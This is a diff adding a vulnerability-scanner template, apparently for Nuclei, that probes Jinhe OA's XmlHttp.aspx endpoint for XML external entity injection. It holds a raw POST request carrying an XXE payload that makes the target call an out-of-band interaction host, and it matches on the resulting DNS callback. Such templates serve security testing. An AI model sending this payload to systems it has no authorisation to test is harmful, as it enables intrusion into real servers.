@@ -1,0 +1,25 @@
+id: jh-XmlHttp-XMLInjection
+info:
+  name: 金和OA-XmlHttpXML外部实体注入
+  author: lemonlove7
+  severity: high
+http:
+  - raw:
+      - |-
+        POST /c6/Jhsoft.Web.Accept/XmlHttp.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 179
+        Connection: close
+        
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [
+        <!ENTITY % remote SYSTEM "http://{{interactsh-url}}">
+        %remote;]>
+        <root/>
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+    matchers-condition: and
